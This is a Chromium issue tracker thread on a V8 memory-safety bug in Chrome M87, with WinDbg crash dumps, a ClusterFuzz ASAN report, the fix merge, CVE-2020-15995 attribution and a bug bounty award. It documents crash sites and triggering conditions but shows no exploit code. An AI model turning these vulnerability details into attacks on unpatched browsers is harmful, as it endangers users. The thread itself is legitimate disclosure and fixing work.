rdx=0000416800000000 rsi=0000003c585fd508 rdi=0000016b823eb420
rip=00007ffa77596875 rsp=0000003c585fd480 rbp=0000000000000009
 r8=ffffffff00000000  r9=0000000000000000 r10=0000416808042429
r11=0000416808243f11 r12=0000416800000000 r13=0000016b823eb408
r14=0000003c585fd508 r15=0000003c585fd658
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
chrome!std::__1::__cxx_atomic_load [inlined in chrome!v8::internal::IncrementalStringBuilder::AppendString+0x35]:
00007ffa`77596875 8b41ff          mov     eax,dword ptr [rcx-1] ds:00004168`1800009b=????????
0:000> u
chrome!std::__1::__cxx_atomic_load [c:\b\s\w\ir\cache\builder\src\v8\src\strings\string-builder.cc @ 317] [inlined in chrome!v8::internal::IncrementalStringBuilder::AppendString+0x35 [c:\b\s\w\ir\cache\builder\src\v8\src\strings\string-builder.cc @ 317]]:
00007ffa`77596875 8b41ff          mov     eax,dword ptr [rcx-1]
00007ffa`77596878 0fb7440207      movzx   eax,word ptr [rdx+rax+7]
00007ffa`7759687d 83e007          and     eax,7
00007ffa`77596880 6683f801        cmp     ax,1
00007ffa`77596884 0f8483000000    je      chrome!v8::internal::IncrementalStringBuilder::AppendString+0xcd (00007ffa`7759690d)
00007ffa`7759688a 4889cb          mov     rbx,rcx
00007ffa`7759688d 4889ca          mov     rdx,rcx
00007ffa`77596890 4c21c2          and     rdx,r8

### cl...@chromium.org (2020-12-14)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6261596686188544.

### p4...@gmail.com (2020-12-14)

This is another testcase which is more directly.

(7ec.1328): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
chrome!Builtins_CompileLazy+0x45:
00007ffa`77a48745 4f8b0481        mov     r8,qword ptr [r9+r8*4] ds:0000589e`dc006668=????????????????
0:000> r r9
r9=0000589e00006668
0:000> r r8
r8=0000000037000000
0:000> dq 0000589e00006668
0000589e`00006668  0000589e`08047e41 0000589e`08047ea1
0000589e`00006678  0000589e`08047f01 0000589e`00084c21
0000589e`00006688  0000589e`00084c81 0000589e`00084ce1
0000589e`00006698  0000589e`00084d41 0000589e`00084da1
0000589e`000066a8  0000589e`00084e01 0000589e`00084e61
0000589e`000066b8  0000589e`00084ec1 0000589e`08047f61
0000589e`000066c8  0000589e`08047fc1 0000589e`08048021
0000589e`000066d8  0000589e`08048081 0000589e`080480e1


### is...@chromium.org (2020-12-14)

[Empty comment from Monorail migration]

### is...@chromium.org (2020-12-14)

#0, thank you for the report.

The fix bisects to a769ea7a4462115579ba87bc16fbffbae01310c1 (a fix for https://crbug.com/chromium/1132111) which wasn't merged to M87.

### cl...@chromium.org (2020-12-14)

Detailed Report: https://clusterfuzz.com/testcase?key=6261596686188544

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7ea91800009b
Crash State:
  v8::internal::IncrementalStringBuilder::AppendString
  v8::internal::NativeCodeFunctionSourceString
  v8::internal::JSFunction::ToString
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=601106:601107

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6261596686188544

The reproduce tool requires a ClusterFuzz source checkout. To prepare one, run:

git clone https://github.com/google/clusterfuzz && cd clusterfuzz && git checkout tags/reproduce-tool-stable

To reproduce this issue, run:

./reproduce.sh -t https://clusterfuzz.com/testcase-detail/6261596686188544 -b /path/to/build

Please use the GN arguments provided in this report when building the binary. If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


The recommended severity (Security_Severity-Medium) is different from what was assigned to the bug. Please double check the accuracy of the assigned severity.

### is...@chromium.org (2020-12-14)

[Empty comment from Monorail migration]

### cl...@chromium.org (2020-12-15)

ClusterFuzz testcase 6261596686188544 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=813460:813464

If this is incorrect, please add the ClusterFuzz-Wrong label and re-open the issue.

### va...@chromium.org (2020-12-15)

ishell@ please go ahead and prepare the merge of https://chromium-review.googlesource.com/c/v8/v8/+/2440519 into 8.7

Adding lakpamarthy@ as 87 release manager and adetaylor@ to check the BM as well and to coordinate the stable respin


The fix is already in 8.8, so nothing to do for this version only 8.7 is affected.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-12-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/6f5eecc2d7968dcf5211592d5f0a0038a06ec943

commit 6f5eecc2d7968dcf5211592d5f0a0038a06ec943
Author: ishell@chromium.org <ishell@chromium.org>
Date: Tue Dec 15 11:02:37 2020

Merged: [parser] Fix AST func reindexing for function fields

Revision: a769ea7a4462115579ba87bc16fbffbae01310c1

NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=leszeks@chromium.org

Bug: chromium:1132111, chromium:1157790
Change-Id: I01ccb83a60163b3c99716f78a5a69a0943cedde3
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2593251
Reviewed-by: Leszek Swirski <leszeks@chromium.org>
Cr-Commit-Position: refs/branch-heads/8.7@{#62}
Cr-Branched-From: 0d81cd72688512abcbe1601015baee390c484a6a-refs/heads/8.7.220@{#1}
Cr-Branched-From: 942c2ef85caef00fcf02517d049f05e9a3d4b440-refs/heads/master@{#70196}

[add] https://crrev.com/6f5eecc2d7968dcf5211592d5f0a0038a06ec943/test/mjsunit/regress/regress-1132111.js
[modify] https://crrev.com/6f5eecc2d7968dcf5211592d5f0a0038a06ec943/src/ast/ast-function-literal-id-reindexer.cc


### [Deleted User] (2020-12-15)

[Empty comment from Monorail migration]

### [Deleted User] (2020-12-15)

[Empty comment from Monorail migration]

### ad...@google.com (2020-12-15)

I _think_ what happened here is that https://crbug.com/chromium/1132111 was fixed, but in https://bugs.chromium.org/p/chromium/issues/detail?id=1132111#c12 Sheriffbot made a mistake in applying merge requests for M85 and M86 instead of M86 and M87. (I think this is a known Sheriffbot bug, https://crbug.com/chromium/991615).

So I believe this bug was fixed in M86, and M88+, but not in M87. Thanks for spotting this, p4nda0223! And thanks for merging ishell@.

### p4...@gmail.com (2020-12-16)

[Comment Deleted]

### p4...@gmail.com (2020-12-16)

[Comment Deleted]

### p4...@gmail.com (2020-12-16)

hi, I found the testcase( test/mjsunit/regress/regress-1132111.js )  seems useless. 
when I add the testcase into the v8 (c588e020c2240c51cdc4b7563f96c48ab6af0751) version and run "~/v8$ tools/run-tests.py --outdir=out.gn/x64.debug mjsunit/regress/regress-113211*" after compiling, it seems that the unpatched version passed the test. log is here:
```
p4nda@xx:~/v8$ tools/run-tests.py --outdir=out.gn/x64.debug mjsunit/regress/regress-113211*
Build found: /home/p4nda/v8/out.gn/x64.debug
>>> Autodetected:
pointer_compression
>>> Running tests for x64.debug
>>> Running with test processors
[00:01|%   0|+   1|-   0]: Done                           
>>> 5230 base tests produced 1 (0%) non-filtered tests
>>> 1 tests ran
```

I also run the testcase in d8, it finishes without any error and even doesn't arrive the patched funciton(AstFunctionLiteralIdReindexer::VisitClassLiteral) in gdb.

I'm not sure whether it's correct to say the unusual phenomenon here or reopen a new issue?

### p4...@gmail.com (2020-12-16)

And will you assign a CVE number to this report?

### ad...@chromium.org (2020-12-16)

I'll leave ishell@ to comment on the test case.

Regarding the CVE, I believe this is the same bug root cause as https://crbug.com/chromium/1132111 (for reasons discussed in https://crbug.com/chromium/1157790#c20) so this is still CVE-2020-15995.

### p4...@gmail.com (2020-12-17)

OK, may I have a credit when the new stable version releases?

### ad...@chromium.org (2020-12-17)

Yes!

### p4...@gmail.com (2020-12-17)

feel sooooooooo happy to hear that!!!
My credit info : Bohan Liu (@P4nda20371774) of Tencent Security Xuanwu Lab

### is...@chromium.org (2020-12-17)

#23: indeed, the regression test seems to be missing a couple of lines from the original report that actually trigger the issue. Thanks!

### ad...@google.com (2021-01-05)

[Empty comment from Monorail migration]

### p4...@gmail.com (2021-01-09)

Hi, may I get reward for this report?

### ad...@chromium.org (2021-01-11)

We'll assess that next time the VRP panel meets, which hopefully will be on Wednesday this week. To set expectations, because this was already a bug we knew about, and would naturally have fixed anyway in M88, this doesn't qualify for our normal reward categories. But we are grateful for the report since it drew attention to our releasing mistake. We'll discuss.

### p4...@gmail.com (2021-01-11)

Thank you for your reply!

### am...@google.com (2021-01-14)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@google.com (2021-01-14)

Congratulations! The VRP panel has decided to award to $1,000 for this report! Someone from our finance team will be in touch. Good job and thank you!

### p4...@gmail.com (2021-01-14)

Thanks for fixing the bug and the reward also!

### ad...@google.com (2021-01-14)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### as...@google.com (2021-01-28)

[Empty comment from Monorail migration]

### as...@google.com (2021-01-28)

Already merged with https://chromium-review.googlesource.com/c/v8/v8/+/2465056

### [Deleted User] (2021-03-23)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1157790?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40054143)*
